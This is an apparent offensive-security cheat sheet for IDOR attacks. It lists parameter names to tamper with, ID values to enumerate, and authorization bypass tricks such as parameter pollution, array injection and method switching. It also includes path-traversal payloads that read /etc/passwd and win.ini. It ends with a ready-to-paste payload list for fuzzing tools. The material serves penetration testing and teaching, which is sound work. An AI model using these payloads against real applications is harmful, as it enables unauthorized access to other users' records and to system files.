# IDOR PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS IDOR?

**Insecure Direct Object Reference (IDOR)** occurs when an application exposes a reference to an internal object (database record, file, etc.) without proper authorization checks. Attackers can manipulate the reference to access other users' data.

**Impact:** Data theft, privilege escalation, account takeover.

---

## 2. COMMON VULNERABLE PARAMETERS

```
id
user_id
userId
account
account_id
accountId
order
order_id
orderId
invoice
invoice_id
file
filename
document
doc
profile
uid
pid
gid
```

---

## 3. BASIC IDOR PAYLOADS (PATTERNS)

**Numeric IDs:**
```
1
2
3
100
1000
-1
0
999999
```

**UUIDs / GUIDs:**
```
123e4567-e89b-12d3-a456-426614174000
00000000-0000-0000-0000-000000000000
```

**Emails / Usernames:**
```
admin@example.com
user@example.com
admin
administrator
root
```

**Filenames:**
```
../../../../etc/passwd
..\..\..\..\windows\win.ini
file.pdf
document.docx
```

**Hashes / Tokens:**
```
5d41402abc4b2a76b9719d911017c592
```

**Encoded IDs:**
```
1 in hex: 0x1
1 in base64: MQ==
1 in URL: %31
```

---

## 4. BYPASS TECHNIQUES

- **HTTP Method Change:** Try `GET`, `POST`, `PUT`, `DELETE`, `PATCH` on the same endpoint.
- **Parameter Pollution:** `?id=1&id=2`
- **Array Injection:** `?id[]=1&id[]=2`
- **JSON Manipulation:** `{"id":1}` → `{"id":2}` or `{"id":[1,2]}`
- **Wildcards:** `?id=*`
- **Null / Empty:** `?id=` or `?id=null`
- **Path Traversal:** `?file=../../etc/passwd`
- **ID Obfuscation:** Use hex, base64, or double encoding.
- **Forced Browsing:** Access known endpoints directly.

---

## 5. TIPS FOR TESTING

1. Identify all parameters that reference objects (IDs, filenames, emails).
2. Change the value to another user's ID (e.g., 1 → 2).
3. Test with different HTTP methods.
4. Try encoded versions (hex, base64, URL encoding).
5. Check for missing authorization in APIs (compare responses).
6. Use Burp Intruder to enumerate IDs.
7. Test both authenticated and unauthenticated access.
8. Look for predictable patterns (sequential IDs, UUIDv1).
9. Test file downloads and profile pages.
10. Always test on your own account first.

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
id=1
id=2
id=3
id=100
id=1000
id=-1
id=0
id=999999
user_id=1
user_id=2
userId=1
userId=2
account=1
account=2
account_id=1
accountId=1
order=1
order_id=1
orderId=1
invoice=1
invoice_id=1
file=1
filename=1
document=1
doc=1
profile=1
uid=1
pid=1
gid=1
123e4567-e89b-12d3-a456-426614174000
00000000-0000-0000-0000-000000000000
admin@example.com
user@example.com
admin
administrator
root
../../../../etc/passwd
..\..\..\..\windows\win.ini
file.pdf
document.docx
5d41402abc4b2a76b9719d911017c592
0x1
MQ==
%31
?id=1&id=2
?id[]=1&id[]=2
{"id":1}
{"id":2}
{"id":[1,2]}
?id=*
?id=
?id=null
```
